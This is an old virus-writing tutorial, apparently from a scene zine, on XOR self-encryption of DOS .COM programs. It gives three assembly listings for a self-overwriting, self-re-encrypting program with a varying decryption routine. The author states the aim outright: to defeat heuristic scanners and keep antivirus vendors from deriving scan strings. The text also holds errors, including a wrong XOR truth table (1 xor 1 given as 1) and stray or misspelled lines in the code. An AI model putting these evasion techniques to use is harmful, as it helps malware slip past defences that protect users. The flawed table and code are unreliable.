@@ -1,0 +1,542 @@
+Encryption, part 1...
+-----------------------------------------------------------------------------
+Definitions:
+------------
+Cryptography: From the Greek      graphe----->to write
+                                  kryptos---->hidden  
+
+ The art of writing with a secret code or "enigmatically".
+
+What is "encryption"?
+---------------------
+Encryption (in our milieu) consists in coding or changing a perfectly legible
+code into another that, at first glance, isn't legible.
+
+Why we encrypt code.
+--------------------
+
+a)To make disassemblies of our code more difficult.
+b)To screw with heuristic scanners.
+c)So that each encryption is different, if possible, in order to keep anti- 
+  virus product developers from coming up with a scan string for your virus 
+  (this would require a combination of encryption and mutation).
+d)To camouflage the code.
+e)For whatever comes to mind.
+
+General format of a program which uses encryption.
+------------------------------------------------------
+
+startprog:         CALL desencripar
+;******************************************************************
+;Portion of the code we wish to encrypt.
+
+mark:               ...
+                    ...
+endmark:            ...
+
+;******************************************************************
+;decryption routine.
+
+desencriptar proc
+                   ...
+                   ...
+                   ...
+desencriptar endp
+
+                    
+From the previous outline you can figure out the following:
+
+a)The header (or -->call desencripta) will remain immutable no matter how
+many times the code bounded by the labels "mark" and "endmark" is
+encrypted in each reproduction.
+
+b)The decryption routine will never itself be encrypted.  Since this routine
+is long, it's easy to come up with a scan string which can be used to
+identify the virus.
+ 
+c)From the preceding you can deduce that the decryption routine should be
+made as short as possible, or better yet, different with each reproduction.
+
+d)Is the encryption routine itself encrypted? --->Redundancy??
+ 
+
+How to encrypt.
+---------------
+The virus must be encrypted just before it reproduces itself.  Basic
+encryption routines generally work by performing logical or arithmetic
+operations on the code.
+
+Using XOR.
+~~~~~~~~~~
+  
+The instruction "XOR destination, source" performs an exclusive OR between
+the "source" and "destination", leaving the result in "destination".
+
+destination    xor   source     destination
+     0                 0             0
+     0                 1             1
+     1                 0             1
+     1                 1             1
+
+The fun thing about XOR is that if we perform the instruction twice with the
+same value we obtain the original datum.
+
+EXAMPLE.
+~~~~~~~~   mov cl,55h
+           mov bl,0aah----------->register bl=AA in hex.
+           xor bl,cl ------------> bl xor cl ---->bl=FF in hex.
+
+           xor bl,cl-------------> bl xor cl ---->bl=AA in hex.
+
+This is ideal for encryption since the encryption and decryption routines are
+identical.
+
+As an example we'll use a COM program that overwrites and encrypts itself
+each time it's executed.
+ 
+Step by step.
+-------------
+1) Unencrypted program.
+;________________________cut here____________________________________
+;compile it with the name "prueba1.com"
+
+code segment
+              org 0100h
+              assume cs:code,ds:code
+programa      proc far
+uno:
+              lea dx, saludo
+              mov ah,09h
+              int 21h                    ;write Minotauro
+        
+              mov ax,3d02h               ;open  prueba1.com
+              lea dx,file                ;read/write mode
+              int 21h                    ;return file handle in ax
+              mov (handle), ax
+
+              mov bx, (handle)
+              lea cx,dos                 ;calculate and store in CX the 
+              lea ax,uno                 ;length in bytes of this program
+              sub cx,ax
+            
+              lea dx,uno                 ;buffer starts at ds:uno 
+            
+              mov ax,4000h
+              int 21h                    ;this program overwrites itself
+            
+              mov ax,3e00h               ;close file prueba1.com
+              int 21h
+
+              mov ah,4ch                 ;return to DOS
+              int 21h
+
+saludo   db  "Minotauro$"
+file     db  "prueba1.com",0
+handle   dw  1 dup (?)   
+dos:
+programa endp
+code ends
+end           programa
+;__________________________cut here_______________________________________
+
+OK, if you executed the program (above) you will have noticed that it runs
+fine.  But suppose the above code belongs to a non-resident .COM infector. 
+In that case, it would be easy for an A/V to get a scan string since the code
+remains the same each time it's executed.  We can avoid that inconvenience by
+encrypting the program using XOR.
+ 
+
+2) Encrypting with XOR.
+
+ The steps to follow are listed below:
+
+ a)Decrypt with the existing key.
+ b)Execute the decrypted program.
+ c)Generate a new key
+ d)Encrypt and over-write.
+ e)Return control.
+ 
+The encryption/decryption routine:
+----------------------------------
+nombre:encr
+
+This routine performs the encryption/decryption functions, therefore it will
+always be the only unencrypted part of the file.  Basically, it will encrypt
+the code located between "mark" and "endmark".  It will perform an XOR with
+a key stored in "xorkey", which is word type variable.  I prefer to XOR with
+a word instead of bytes since with the former we can have as many as 65535
+variants versus only 255 using bytes (not exactly true based on the way
+the key is generated).
+
+Usually you'll do a XOR for the first time with the key equal to zero.  Later
+the program will generate a new key, using Int21 service 2c: read DOS's date
+and time stamp.  This new key is stored in xorkey and will be used at the
+moment of encryption.  Obviously, the variable xorkey is not encrypted.
+
+ONE LAST THING.
+---------------
+
+Since we are trying to encrypt as much of the code as possible, the part
+about copying and then returning control to DOS (or the host program, if we
+are writing a virus) must be copied into memory at the end of the virus, else
+it would remain unencrypted.  This is the portion of the code located between
+"l1" and "l2".
+
+
+;___________________________cut____here____________________________________
+;compile with the name prueba2.com
+
+code segment
+              org 0100h
+              assume cs:code,ds:code
+programa      proc far
+uno:
+;****************************************************************************
+;This part of the program is to find the delta offset to redirect through bp,
+since if the virus is to be attached to the end of the .COM file, the
+pointers would be mis-addressed.
+
+              CALL falso
+falso proc
+falso endp
+              pop bp
+              sub bp,0103h
+;**************************************************************************
+***
+              call encr_desc
+mark:
+
+
+start:
+              lea dx, saludo + bp
+              mov ah,09h
+              int 21h                    ;write Minotauro
+
+;             etc....etc....etc
+
+;******************************************************************
+;Move everything between l1 and l2 to the end of the code.
+;This would be the part of the virus which handles reproduction and returns
+;control to the host program
+;We do this to try to encrypt as much of the code as possible.
+
+
+              cld
+              lea si, l1 + bp
+              lea di, dos + bp
+              lea cx, l2
+              lea ax, l1
+              sub cx,ax
+              sar cx, 1
+              inc cx
+              rep movsw
+
+;*******************************************************************
+              call rand        ;Obtains a random 16-bit number to use  
+                               ;as the new key.
+              mov word ptr [xorkey+bp],dx
+;********************************************************************
+
+              jmp dos
+l1:
+;Finds the offset where the encr_desc routine is located, then stores it
+;in called so as to later call it by way of memory.
+
+              lea ax, rutina + bp
+              mov [called + bp], ax
+      
+              mov ax,3d02h                  ;opens prueba1.com
+              lea dx,file+bp                ;read/write mode
+              int 21h                       ;returns file handle in ax
+              mov [handle + bp], ax
+
+              mov bx, [handle + bp]
+              lea cx,dos+bp                 ;calculates and stores in cx
+              lea ax,uno+bp                 ;its length in bytes.
+programa
+              sub cx,ax
+            
+              lea dx,uno+bp              ;buffer starts at ds:uno  
+            
+              push bx
+              push cx
+              push dx
+
+              call [called+bp]           ;encrypt using the new key
+            
+              pop dx
+              pop cx
+              pop bx
+
+              mov ax,4000h
+              int 21h                    ;the program is overwritten.
+
+            
+              mov ax,3e00h               ;close prueba1.com
+              int 21h
+
+              mov ah,4ch                 ;return to DOS
+              int 21h
+l2:
+
+;**********************************************************************
+rand proc
+;generates a random key by reading the clock (minutes and seconds), storing
+;the result in dx.
+              mov ah,2ch
+              int 21h
+              ret
+rand endp
+;**********************************************************************
+
+saludo   db  "Minotauro$"
+file     db  "prueba2.com",0
+handle   dw   1 dup (?)
+
+endmark:      nop
+              nop
+;The encryption ends at "endmark".  Since we are working with a word and
+;the calculation could make the last encryption word begin at the address of
+;handle+1, we place a second nop so that the encryption key remains 
+;unencrypted (as it should be).  
+;We could have also placed endmark before handel and left out the nop's.
+
+
+xorkey       dw 1 dup (0)                ;word where the key is stored.
+called       dw 1 dup (0)
+
+;********************encryption/decryption routine************************
+rutina:
+;This label (rutina) is here since we call the encryption routine from
+;memory.
+
+encr_desc    proc
+             lea bx, mark + bp
+             lea dx, endmark + bp
+             mov cx, dx
+             sub cx,bx
+             sar cx, 1
+             inc cx
+             mov dx, [xorkey + bp]
+xorloop:     xor [bx],dx           ;bx word pointer to encrypt or decrypt
+             add bx,02             ;dx the key
+             loop xorloop
+             ret
+encr_desc    endp
+;***************************************************************************
+dos:
+programa endp
+code ends
+end           programa
+;____________________________cut___here__________________________________
+
+OK, you'll notice when you run your program that there are few parts of it
+that remain constant.  These parts are:
+****************************************************************************
+              CALL falso
+falso proc
+falso endp
+              pop bp
+              sub bp,0103h
+
+This part isn't going to cause us problems since it uses few bytes.  Anyhow,
+we can use a little trick we'll see later.
+ 
+****************************************************************************
+
+xorkey       dw 1 dup (0)                ;word where the key is stored.
+called       dw 1 dup (0)
+
+Not a problem since xorkey is different after each execution.
+
+****************************************************************************
+encr_desc    proc
+             lea bx, mark + bp
+             lea dx, endmark + bp
+             mov cx, dx
+             sub cx,bx
+             sar cx, 1
+             inc cx
+             mov dx,[xorkey + bp]
+xorloop:     xor [bx],dx           ;bx pointer to the encrypt/decrypt word
+             add bx,02             ;dx key
+             loop xorloop
+             ret
+encr_desc    endp
+
+This would be the most extensive unencrypted section of code, and thus its
+weakest link.  To avoid this, let's suppose that aaaa .... cccc are random
+16-bit numbers generated the same as xorkey and we change our routine as
+follows:
+
+encr_desc    proc
+             lea bx, mark + bp
+antiscan:
+             add bx,aaaa------>agregado  ;agregado = aggregate
+             sub bx,aaaa------>agregado
+
+             lea dx, endmark + bp
+             mov cx, dx
+             sub cx,bx
+
+             add cx,bbbb ------>agregado
+             sub cx,bbbb ------>agregado
+
+             sar cx, 1
+             inc cx
+             mov dx, [xorkey + bp]
+xorloop:     xor [bx],dx           ;bx pointer of the word used to          
+                                   ; encrypt/decrypt 
+             add bx,02             ;dx the key
+             
+             add bx,cccc------>agregado
+             sub bx,cccc------>agregado
+
+             loop xorloop
+             ret
+encr_desc    endp
+
+Note that when we ad and subtract the same quantity the contents of the
+register don't change, but the generated code does.  This ensures that the
+code from which a string could be generated is of minimum length.
+
+How do we do this? .... Simple, before reproducing (the virus) we calculate
+aaaa.....cccc and place these numbers in the routine.
+*****************************************************************************
+
+Let's look at code which has been modified in this manner.
+----------------------------------------------------------
+
+;____________________________cut___here____________________________________
+;compile using the name prueba3.com
+
+code segment
+              org 0100h
+              assume cs:code,ds:code
+programa      proc far
+uno:
+              call falso
+falso         proc
+falso         endp     
+              pop bp
+              sub bp,0103h
+              call encr_desc
+mark:
+start:
+              lea dx, saludo + bp
+              mov ah,09h
+              int 21h                    ;write Minotauro
+;             etc....etc....etc
+              cld
+              lea si, l1 + bp
+              lea di, dos + bp
+              lea cx, l2
+              lea ax, l1
+              sub cx,ax
+              sar cx, 1
+              inc cx
+              rep movsw
+              call rand        ;Obtain a random 16-bit number to use as
+                               ;the new key
+              mov word ptr [xorkey+bp],dx
+;********************************************************************
+;aggregate to vary the encryption routine........
+
+              lea di,antiscan+bp        ;pointer in di
+              call rand                 ;find aaaa
+              mov [di+bp+2],dx          ;place aaaa
+              mov [di+bp+6],dx          ;place aaaa
+              call rand                 ;find bbbb
+              mov [di+bp+18],dx         ;place bbbb
+              mov [di+bp+22],dx         ;place bbbb
+              call rand                 ;find cccc
+              mov [di+bp+39],dx         ;place cccc
+              mov [di+bp+43],dx         ;place cccc
+
+
+
+              jmp dos
+l1: 
+              lea ax, rutina + bp
+              mov [called + bp], ax
+              mov ax,3d02h                  ;open file prueba1.com
+              lea dx,file+bp                ;read/write mode
+              int 21h                       ;return file handle in ax
+              mov [handle + bp], ax
+              mov bx, [handle + bp]
+              lea cx,dos+bp                 ;calculate and store in cx it's
+              lea ax,uno+bp                 ;length in bytes.
+programa
+              sub cx,ax
+              lea dx,uno+bp              ;buffer starts at ds:uno   
+              push bx
+              push cx
+              push dx
+              call [called+bp]           ;encrypt with the new key.
+              pop dx
+              pop cx
+              pop bx
+              mov ax,4000h
+              int 21h                    ;program is over written
+              mov ax,3e00h               ;close file prueba1.com
+              int 21h
+              mov ah,4ch                 ;return to DOS
+              int 21h
+l2:
+rand proc
+              mov ah,2ch
+              int 21h
+              ret
+rand endp
+saludo   db  "Minotauro$"
+file     db  "prueba3.com",0
+handle   dw   1 dup (?)
+endmark:      nop
+              nop
+xorkey       dw 1 dup (0)                ;word where the key is stored.
+called       dw 1 dup (0)
+rutina:
+encr_desc    proc
+             lea bx,mark+bp
+antiscan:
+             add bx,1111h
+             sub bx,1111h
+             lea dx, endmark + bp
+             mov cx, dx
+             sub cx,bx
+             add cx,2222h
+             sub cx,2222h
+             sar cx, 1
+             inc cx
+             mov dx, [xorkey + bp]
+xorloop:     xor [bx],dx           ;bx pointer of the word to encrypt and   
+                                   ;decrypt
+             add bx,02             ;dx the key
+             add bx,3333h
+             sub bx,3333h
+             loop xorloop
+             ret
+encr_desc    enp
+dos:
+programa endp
+code ends
+end           programa
+;_______________________cut___here___________________________________
+
+
+Now the encr_desc routine will change somewhat every time the virus
+reproduces.  Is this the "final solution"?  No, even though we've made life
+complicated for the A/Vs a scan string can still be found.  Still, it'll take
+them more time.. hehehehe!  There has to be a reason why mutation was
+developed, eh?  ;)
+I think the xor method of encryption has been explained enough.
+As you can see the decryption routine doesn't have to be the same as the
+encryption routine.  It only has to undo the changes made by the encryption
+routine.  For example, we could add a number and encrypt, then decrypt
+subtracting, or by rotating each byte "x" number of times to the right and
+decrypt by rotating to the left. or a mixture of all these techniques.  
+
+Enjoy! 
+
+Bye:LAPIDARIO.
+
